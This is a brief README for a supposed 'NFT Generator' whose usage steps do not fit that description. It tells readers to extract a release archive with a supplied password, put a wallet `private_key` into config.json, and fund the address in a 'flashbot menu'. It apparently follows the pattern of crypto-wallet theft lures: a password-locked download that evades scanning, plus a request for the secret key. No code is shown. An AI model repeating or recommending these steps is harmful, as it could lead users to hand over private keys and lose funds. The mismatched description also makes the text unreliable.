## What is NFT Generator?

An NFT generator is a tool or software that allows users to create their own non-fungible tokens (NFTs). These NFTs are unique digital assets that are stored on a blockchain and cannot be replicated or exchanged for something else due to their distinct characteristics.

## Usage
- Clone the repository release and extract files with password `whLn1sTWT`.
- Edit the address and `private_key` fields in the `config.json` file.
- Set up the network and AMMs in the flashbot menu. Ensure that there are sufficient funds on the specified address to cover transaction fees
